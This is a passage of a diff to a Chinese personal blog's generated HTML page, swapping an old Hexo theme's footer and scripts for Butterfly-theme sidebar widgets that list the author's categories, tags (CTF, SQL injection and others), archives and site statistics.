+接受来的id参 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/5/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/#content-inner">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/#content-inner">12</a><a class="extend next" rel="next" href="/page/7/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看吧</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" title="蓝帽杯半决赛wp_电子取证部分">蓝帽杯半决赛wp_电子取证部分</a><time datetime="2023-09-16T13:26:55.732Z" title="发表于 2023-09-16 21:26:55">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/" title="蓝帽杯半决赛wp_web部分">蓝帽杯半决赛wp_web部分</a><time datetime="2023-09-16T13:18:03.466Z" title="发表于 2023-09-16 21:18:03">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构">数据结构</a><time datetime="2023-08-30T08:37:08.678Z" title="发表于 2023-08-30 16:37:08">2023-08-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
             </div>
-        </div>
-    </div>
-
-
-
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    拒绝划水，拒绝摸鱼
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2023%E5%A4%8D%E7%9B%98/">2023复盘</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">侧信道攻击</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">蓝帽杯半决赛wp_电子取证部分</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/">蓝帽杯半决赛wp_web部分</a>
-            </li>
-            
-        </ul>
-    </div>
-
-
-
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/CSS/">CSS</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/CSS/ing/">ing</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/Hadoop/">Hadoop</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/ing/">ing</a>
-        </li>
-        
-    </ul>
-</div>
-
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-github"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-twitter"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-facebook"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-instagram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-dribbble"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-telegram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-behance"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-500px"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="mailto:a18888200398@163.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-envelope-o"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="\#">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-rss"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
-            </div>
-        </div>
-    </div>
-</footer>
-
-<!-- After footer scripts -->
-
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
-
-<script src="/js/main.js"></script>
-
-
-<!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
-
-
-
-</body>
-
-</html>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/"><span class="card-category-list-name">CSS</span><span class="card-category-list-count">1</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">40</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/linux/"><span class="card-category-list-name">linux</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ping/"><span class="card-category-list-name">ping</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">sql注入</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">手动注入</span><span class="card-category-list-count">1</span></a></li></ul></li></ul></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: #999">手动注入</a> <a href="/tags/ing/" style="font-size: 1.43em; color: #99a6b9">ing</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.3em; color: #99a1ac">sql注入</a> <a href="/tags/Javaweb/" style="font-size: 1.1em; color: #999">Javaweb</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 1.1em; color: #999">系统</a> <a href="/tags/%E5%AF%86%E9%92%A5/" style="font-size: 1.1em; color: #999">密钥</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 1.1em; color: #999">信息泄露</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1.1em; color: #999">远程登录服务器</a> <a href="/tags/%E5%88%86%E7%9B%98/" style="font-size: 1.1em; color: #999">分盘</a> <a href="/tags/Hive/" style="font-size: 1.1em; color: #999">Hive</a> <a href="/tags/mysql/" style="font-size: 1.1em; color: #999">mysql</a> <a href="/tags/%E8%BF%9B%E5%88%B6/" style="font-size: 1.1em; color: #999">进制</a> <a href="/tags/tmux/" style="font-size: 1.1em; color: #999">tmux</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/" style="font-size: 1.1em; color: #999">脚本小子</a> <a href="/tags/phpstudy/" style="font-size: 1.1em; color: #999">phpstudy</a> <a href="/tags/Hadoop/" style="font-size: 1.1em; color: #999">Hadoop</a> <a href="/tags/CSS/" style="font-size: 1.1em; color: #999">CSS</a> <a href="/tags/go/" style="font-size: 1.3em; color: #99a1ac">go</a> <a href="/tags/PHP/" style="font-size: 1.3em; color: #99a1ac">PHP</a> <a href="/tags/ping/" style="font-size: 1.1em; color: #999">ping</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.1em; color: #999">编码</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/" style="font-size: 1.1em; color: #999">数据可视化</a> <a href="/tags/HTML/" style="font-size: 1.17em; color: #999c9f">HTML</a> <a href="/tags/awd/" style="font-size: 1.1em; color: #999">awd</a> <a href="/tags/%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">网站备份漏洞</a> <a href="/tags/github/" style="font-size: 1.1em; color: #999">github</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.37em; color: #99a4b2">数据库</a> <a href="/tags/hadoop/" style="font-size: 1.23em; color: #999ea6">hadoop</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: #999">机器学习</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.1em; color: #999">实战</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/Java/" style="font-size: 1.17em; color: #999c9f">Java</a> <a href="/tags/linux/" style="font-size: 1.37em; color: #99a4b2">linux</a> <a href="/tags/acm%E7%AE%97%E6%B3%95/" style="font-size: 1.23em; color: #999ea6">acm算法</a> <a href="/tags/vim/" style="font-size: 1.1em; color: #999">vim</a> <a href="/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/" style="font-size: 1.1em; color: #999">磁盘管理</a> <a href="/tags/ssh/" style="font-size: 1.1em; color: #999">ssh</a> <a href="/tags/IP/" style="font-size: 1.1em; color: #999">IP</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/" style="font-size: 1.23em; color: #999ea6">文件修复</a> <a href="/tags/goweb/" style="font-size: 1.1em; color: #999">goweb</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">106</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-15T05:56:43.525Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div><div class="card-widget user-map" id="user-map"><div class="item-headline"><i class="fas fa-heartbeat"></i><span>訪客地圖</span></div><div class="item-content"></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
